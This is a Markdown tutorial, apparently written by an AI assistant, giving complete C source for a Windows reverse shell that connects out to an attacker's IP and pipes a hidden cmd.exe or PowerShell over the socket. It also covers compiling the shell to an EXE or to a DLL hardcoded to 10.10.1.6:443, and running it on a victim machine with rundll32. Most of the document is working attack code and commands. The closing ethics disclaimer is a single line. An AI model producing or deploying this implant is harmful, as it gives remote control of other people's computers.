# Reverse Shell C Code Tutorial for Windows

This guide demonstrates how to create a reverse shell in C on Windows using Winsock2, compile it, and optionally wrap it into a DLL that can be executed remotely.

## **Code Walkthrough**

The following code creates a reverse shell that connects to a specified IP and port and then runs a command shell (`cmd.exe`) remotely over the network.

### **Code Explanation**

```c
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"0.0.0.0"
# define CLIENT_PORT (int)0
#endif
/* ================================================== */

int main(void) {
    // Check if the IP and Port are defined
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
        write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
        return (1);
    }

    // Socket Initialization 
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
        write(2, "[ERROR] WSASturtup failed.\n", 27);
        return (1);
    }

    // Server Setup 
    int port = CLIENT_PORT;
    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET; // AF_INET: Internet address family (IPv4)
    sa.sin_port = htons(port); // Converts port to network byte order
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP); // Converts CLIENT_IP to binary form (inet_addr)

    // Connect to the remote server
    if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        write(2, "[ERROR] connect failed.\n", 24);
        return (1);
    }

    // Redirect Input/Output to Socket
    STARTUPINFO sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES);
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;
    PROCESS_INFORMATION pinfo;

    // Create the command shell process (cmd.exe)
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
    return (0);
}
```

### **Key Components**

1. **Socket Initialization**
   - The code starts by initializing Winsock using `WSAStartup()`.
   
2. **Server Setup**
   - The `sockaddr_in` structure is configured to set up the connection parameters such as IP address and port.
   
3. **Establish Connection**
   - The `connect()` function establishes a connection to the target IP and port.

4. **Redirect Input/Output**
   - The `STARTUPINFO` structure is used to redirect standard input, output, and error streams to the socket.
   
5. **Process Creation**
   - `CreateProcessA()` is used to spawn the `cmd.exe` shell on the victim machine, which will interact with the attacker via the socket.

### **Alternative for PowerShell Reverse Shell**

You can replace `"cmd"` with `"powershell"` to launch PowerShell as a reverse shell instead of `cmd.exe`:

```c
CreateProcessA(NULL, "powershell", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
```

---

## **Compile the C File to .exe**

You can compile the C file to a Windows executable using MinGW.

### **For 32-bit Windows Target:**

```bash
x86_64-w64-mingw32-gcc -o output.exe source.c -lws2_32
```

### **For 64-bit Windows Target:**

```bash
x86_64-w64-mingw32-gcc -o output.exe source.c -lws2_32
```

The `-lws2_32` flag links the **Winsock2** library, which is required for network-related APIs.

---

## **Compile the C File to .dll**

You can also compile the code into a DLL to be executed with `rundll32`.

### **Create the DLL:**

```c
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int vbs(const char *CLIENT_IP, int CLIENT_PORT) {
    // Socket Initialization 
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
        write(2, "[ERROR] WSASturtup failed.\n", 27);
        return (1);
    }

    // Server Setup 
    int port = CLIENT_PORT;
    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET; // AF_INET: Internet address family (IPv4)
    sa.sin_port = htons(port); // Converts port to network byte order
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP); // Converts CLIENT_IP to binary form (inet_addr)

    if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        write(2, "[ERROR] connect failed.\n", 24);
        return (1);
    }

    // Redirect Input/Output to Socket
    STARTUPINFO sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES);
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;
    PROCESS_INFORMATION pinfo;

    // Create the command shell process (cmd.exe)
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
    return (0);
}

void Function_name() {
    vbs("10.10.1.6", 443);
}
```

### **Compile the DLL:**

To compile the code into a DLL, use:

```bash
x86_64-w64-mingw32-gcc -o reverse.dll reversedll.c -lws2_32 -shared
```

---

## **Export Function from DLL**

You can inspect the exported functions of the DLL using the `pefile` Python module.

### **Using `pefile` to List DLL Exports:**

```bash
python -m pefile exports reverse.dll
```

This will output a list of exported functions from the DLL, like:

```bash
0x3a8c11541 b'Function_name' 1
```

---

## **Test the DLL File Manually**

To test the DLL manually from the victim machine, use the following command:

```bash
rundll32 reverse.dll,Function_name
```

This will invoke the function `Function_name()` inside the `reverse.dll` and execute the reverse shell.

---

## **Conclusion**

This guide demonstrated how to create a reverse shell in C, compile it into a Windows executable or DLL, and run it remotely. The core of this process involves setting up a socket connection and redirecting input/output to that socket. You can adapt this method to other tasks, such as creating a remote command execution tool or experimenting with PowerShell.

---

### **Important Note**

This code should be used in a legal and ethical context only, such as in penetration testing environments where you have permission to test security vulnerabilities.
```

---

This Markdown document will look clean and organized when rendered on GitHub. It clearly explains each code block and provides instructions for compiling the C code into a `.exe` or `.dll`.
